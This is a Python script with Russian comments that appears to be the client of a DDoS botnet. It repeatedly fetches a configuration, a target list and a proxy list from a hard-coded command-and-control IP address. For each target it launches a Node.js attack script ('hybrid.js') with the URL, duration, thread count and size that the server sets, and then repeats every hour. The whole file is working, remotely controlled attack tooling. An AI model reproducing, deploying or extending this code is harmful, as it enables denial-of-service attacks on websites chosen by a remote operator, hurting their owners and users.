import json
import subprocess
import time
import requests

# URL для получения файла config.json и targets.json
CONFIG_URL = "http://121.127.37.120/config.json"
TARGETS_URL = "http://121.127.37.120/targets.json"
PROXY_FILE_PATH = "proxy.txt"

def update_proxy_file(proxy_url):
    try:
        response = requests.get(proxy_url)
        response.raise_for_status()  # Проверяем наличие ошибок HTTP
        with open(PROXY_FILE_PATH, "w") as file:
            file.write(response.text)
        print("Proxy file updated successfully")
    except requests.RequestException as e:
        print(f"Error updating proxy file: {e}")

def load_config():
    try:
        response = requests.get(CONFIG_URL)
        response.raise_for_status()  # Проверяем наличие ошибок HTTP
        return response.json()
    except requests.RequestException as e:
        print(f"Error loading config file: {e}")
        return None

def load_targets():
    try:
        response = requests.get(TARGETS_URL)
        response.raise_for_status()  # Проверяем наличие ошибок HTTP
        print("Targets loaded successfully")
        return response.json()
    except requests.RequestException as e:
        print(f"Error loading targets: {e}")
        return None

def run_attack(target, config):
    try:
        url = target["url"]
        duration = target["duration"]  # Используем значение из targets.json
        threads = target["threads"]    # Используем значение из targets.json
        size = target["size"]          # Используем значение из targets.json
        proxy_file = target.get("proxy_file", config.get("proxy_file", "proxy.txt"))

        # Формируем команду для запуска атаки
        command = ["node", "hybrid.js", url, str(duration), str(threads), str(size), proxy_file]
        print(f"Running command: {' '.join(command)}")
        subprocess.Popen(command)
    except KeyError as e:
        print(f"Missing key in target: {e}")
    except Exception as e:
        print(f"Error running attack: {e}")

def main():
    # Загружаем конфигурацию и прокси
    config = load_config()
    if not config:
        print("Error: Config file not loaded. Exiting.")
        return

    while True:
        # Обновляем список прокси
        update_proxy_file(config.get("proxy_url", "http://121.127.37.120/proxy.txt"))

        # Загружаем цели
        targets = load_targets()
        if targets:
            for target in targets.get("targets", []):
                run_attack(target, config)

        # Ожидаем перед следующей проверкой
        time.sleep(config.get("check_interval", 3600))  # Используем значение из config.json

if __name__ == "__main__":
    main()